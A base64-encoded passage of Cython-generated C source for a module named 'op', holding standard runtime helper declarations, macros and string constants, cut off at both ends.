ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTtcbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEU19NRVRIT0QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZikgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZiktPmZ1bmNfdmVjdG9yY2FsbClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGYpICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmKS0+dmVjdG9yY2FsbClcbiNlbmRpZlxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX05ldyhQeU1ldGhvZERlZiAqbWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTtcblxuXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUVcbnN0YXRpYyBpbnQgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBpbnQgY19saW5lKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKHRzdGF0ZSwgY19saW5lKSAgKCgoQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSykpID8gY19saW5lIDogMClcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG50eXBlZGVmIFB5T2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlO1xuI2Vsc2VcbnR5cGVkZWYgUHlDb2RlT2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlO1xuI2VuZGlmXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0O1xuICAgIGludCBjb2RlX2xpbmU7XG59IF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5O1xuc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSB7XG4gICAgaW50IGNvdW50O1xuICAgIGludCBtYXhfY291bnQ7XG4gICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXM7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhY2Nlc3Nvcl9jb3VudDtcbiAgI2VuZGlmXG59O1xuc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpO1xuc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpO1xuc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCk7XG5cblxuc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSk7XG5cblxuI2lmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gNikpXG4jZGVmaW5lIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQ1xuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgbG9uZyBfX1B5eF9QeUxvbmdfQXNfbG9uZyhQeU9iamVjdCAqKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxudHlwZWRlZiBQeU9iamVjdCAqX19QeXhfVHlwZU5hbWU7XG4jZGVmaW5lIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJVUiXG4jZGVmaW5lIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmopIFB5X1hERUNSRUYob2JqKVxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lIFB5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWVcbiNlbHNlXG5zdGF0aWMgX19QeXhfVHlwZU5hbWUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKTtcbiNlbmRpZlxuI2Vsc2UgIC8vICFMSU1JVEVEX0FQSVxudHlwZWRlZiBjb25zdCBjaGFyICpfX1B5eF9UeXBlTmFtZTtcbiNkZWZpbmUgX19QeXhfRk1UX1RZUEVOQU1FICIlLjIwMHMiXG4jZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUodHApICgodHApLT50cF9uYW1lKVxuI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKik7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBfX1B5eF9Jc1N1YnR5cGUoUHlfVFlQRShvYmopLCAoUHlUeXBlT2JqZWN0ICopdHlwZSlcbiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgX19QeXhfSXNBbnlTdWJ0eXBlMihQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlMSwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZTEsIFB5T2JqZWN0ICp0eXBlMik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZSlcbiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgKFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlMSkgfHwgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKSlcbiNkZWZpbmUgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSkgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKSB7XG4gICAgcmV0dXJuIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUxKSB8fCBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlMik7XG59XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlczIoZXJyMSwgZXJyMikgIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSwgZXJyMSwgZXJyMilcbiNkZWZpbmUgX19QeXhfUHlFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19FeGNlcHRpb24pXG4jaWZkZWYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVja1xuICAjZGVmaW5lIF9fUHl4X1B5QmFzZUV4Y2VwdGlvbl9DaGVjayhvYmopIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sob2JqKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUJhc2VFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19CYXNlRXhjZXB0aW9uKVxuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2UoUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiLCBQeU9iamVjdCAqY2F1c2UpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSSh2b2lkKTtcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMsIGludCBpdGVybmV4dCk7XG5cblxuc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdDtcbnR5cGVkZWYgUHlPYmplY3QgKigqX19weXhfY29yb3V0aW5lX2JvZHlfdCkoc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdCAqLCBQeVRocmVhZFN0YXRlICosIFB5T2JqZWN0ICopO1xuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiNkZWZpbmUgX19QeXhfRXhjSW5mb1N0cnVjdCAgX1B5RXJyX1N0YWNrSXRlbVxuI2Vsc2VcbnR5cGVkZWYgc3RydWN0IHtcbiAgICBQeU9iamVjdCAqZXhjX3R5cGU7XG4gICAgUHlPYmplY3QgKmV4Y192YWx1ZTtcbiAgICBQeU9iamVjdCAqZXhjX3RyYWNlYmFjaztcbn0gX19QeXhfRXhjSW5mb1N0cnVjdDtcbiNlbmRpZlxudHlwZWRlZiBzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0IHtcbiAgICBQeU9iamVjdF9IRUFEXG4gICAgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5O1xuICAgIFB5T2JqZWN0ICpjbG9zdXJlO1xuICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgZ2lfZXhjX3N0YXRlO1xuICAgIFB5T2JqZWN0ICpnaV93ZWFrcmVmbGlzdDtcbiAgICBQeU9iamVjdCAqY2xhc3NvYmo7XG4gICAgUHlPYmplY3QgKnlpZWxkZnJvbTtcbiAgICBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgeWllbGRmcm9tX2FtX3NlbmQ7XG4gICAgUHlPYmplY3QgKmdpX25hbWU7XG4gICAgUHlPYmplY3QgKmdpX3F1YWxuYW1lO1xuICAgIFB5T2JqZWN0ICpnaV9tb2R1bGVuYW1lO1xuICAgIFB5T2JqZWN0ICpnaV9jb2RlO1xuICAgIFB5T2JqZWN0ICpnaV9mcmFtZTtcbiNpZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HICYmIChDWVRIT05fUFJPRklMRSB8fCBDWVRIT05fVFJBQ0UpXG4gICAgUHlNb25pdG9yaW5nU3RhdGUgX19weXhfcHltb25pdG9yaW5nX3N0YXRlW19fUHl4X01vbml0b3JpbmdFdmVudFR5cGVzX0N5R2VuX2NvdW50XTtcbiAgICB1aW50NjRfdCBfX3B5eF9weW1vbml0b3JpbmdfdmVyc2lvbjtcbiNlbmRpZlxuICAgIGludCByZXN1bWVfbGFiZWw7XG4gICAgY2hhciBpc19ydW5uaW5nO1xufSBfX3B5eF9Db3JvdXRpbmVPYmplY3Q7XG5zdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ldyhcbiAgICBQeVR5cGVPYmplY3QgKnR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7XG5zdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoXG4gICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsXG4gICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqc2VsZik7XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZik7XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9BbVNlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXR2YWwpO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKTtcbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqKnJldHZhbCk7XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqYXJncyk7XG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfU3dhcEV4Y2VwdGlvbihzZWxmKVxuI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihzZWxmKSAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKCYoc2VsZiktPmdpX2V4Y19zdGF0ZSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpIHtcXFxuICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlLCAmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayk7XFxcbiAgICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKCYoc2VsZiktPmdpX2V4Y19zdGF0ZSk7XFxcbiAgICB9XG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpIHtcXFxuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2spO1xcXG4gICAgKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUgPSAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHJhY2ViYWNrID0gTlVMTDtcXFxuICAgIH1cbiNlbmRpZlxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9QeUdlbl9GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShwdmFsdWUpXFxcbiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19weXhfdHN0YXRlLCBwdmFsdWUpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUdlbl9GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShwdmFsdWUpXFxcbiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBwdmFsdWUpXG4jZW5kaWZcbnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSk7XG5zdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pO1xuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pO1xuc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKTtcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlcihQeU9iamVjdCAqZ2VuLCB2b2lkICpjbG9zdXJlKTtcbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG5zdGF0aWMgdm9pZCBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQoUHlUeXBlT2JqZWN0ICp0eXBlLCBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCAqc3RhdGljX2Ftc2VuZF9tZXRob2RzLCBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgYW1fc2VuZCk7XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKTtcblxuXG4jZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4jZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KG9iaikgX19QeXhfSVNfVFlQRShvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0dlbmVyYXRvclR5cGUpXG4jZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9OZXcoYm9keSwgY29kZSwgY2xvc3VyZSwgbmFtZSwgcXVhbG5hbWUsIG1vZHVsZV9uYW1lKVxcXG4gICAgX19QeXhfX0Nvcm91dGluZV9OZXcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSwgYm9keSwgY29kZSwgY2xvc3VyZSwgbmFtZSwgcXVhbG5hbWUsIG1vZHVsZV9uYW1lKVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfTmV4dChQeU9iamVjdCAqc2VsZik7XG5zdGF0aWMgaW50IF9fcHl4X0dlbmVyYXRvcl9pbml0KFB5T2JqZWN0ICptb2R1bGUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KFB5T2JqZWN0ICpzZWxmKTtcblxuXG5zdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKHZvaWQpO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcik7XG5cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKHZvaWQqKTtcbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlKFB5T2JqZWN0KiBtb2R1bGUsIHZvaWQqKTtcbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKHZvaWQqKTtcbiNlbGlmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUgUHlTdGF0ZV9GaW5kTW9kdWxlXG4jZGVmaW5lIF9fUHl4X1N0YXRlX0FkZE1vZHVsZSBQeVN0YXRlX0FkZE1vZHVsZVxuI2RlZmluZSBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUgUHlTdGF0ZV9SZW1vdmVNb2R1bGVcbiNlbmRpZlxuXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAjaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYICAiX2Zhc3RjYWxsIlxuICAgICNlbHNlXG4gICAgICAgICNkZWZpbmUgX19QWVhfRkFTVENBTExfQUJJX1NVRkZJWFxuICAgICNlbmRpZlxuICAgICNkZWZpbmUgX19QWVhfTElNSVRFRF9BQklfU1VGRklYICJsaW1pdGVkIiBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWFxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWFxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMVxuICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYXG4jZWxpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG4gICAgI2RlZmluZSBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVggImFtc2VuZGJhY2twb3J0IlxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWCAibm9hbXNlbmQiXG4jZW5kaWZcbiNpZm5kZWYgX19QWVhfTU9OSVRPUklOR19BQklfU1VGRklYXG4gICAgI2RlZmluZSBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVhcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIF9fUFlYX1RQX0ZJTkFMSVpFX0FCSV9TVUZGSVhcbiNlbHNlXG4gICAgI2RlZmluZSBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYICJub2ZpbmFsaXplIlxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMgfHwgIWRlZmluZWQoX19QeXhfQXN5bmNHZW5fVVNFRClcbiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYXG4jZWxzZVxuICAgICNkZWZpbmUgX19QWVhfRlJFRUxJU1RTX0FCSV9TVUZGSVggIm5vZnJlZWxpc3RzIlxuI2VuZGlmXG4jZGVmaW5lIENZVEhPTl9BQkkgIF9fUFlYX0FCSV9WRVJTSU9OIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWCBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVggX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWCBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWCBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVhcbiNkZWZpbmUgX19QWVhfQUJJX01PRFVMRV9OQU1FICJfY3l0aG9uXyIgQ1lUSE9OX0FCSVxuI2RlZmluZSBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggX19QWVhfQUJJX01PRFVMRV9OQU1FICIuIlxuXG5cblxuXG5cbiNkZWZpbmUgX19QeXhfTU9EVUxFX05BTUUgIm9wIlxuZXh0ZXJuIGludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl9vcDtcbmludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl9vcCA9IDA7XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fcHJpbnQ7XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5faW5wdXQ7XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fb3BlbjtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9yYW5nZTtcblxuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19bXSA9ICJcXG5cXG5cXG4iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18wW10gPSAiMCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFbXSA9ICIxIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfNFtdID0gIjQiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hW10gPSAiYSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2JbXSA9ICJiIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZVtdID0gImUiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19mW10gPSAiZiI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lbXSA9ICJpIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfa1tdID0gImsiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tW10gPSAibSI7XG5zdGF0a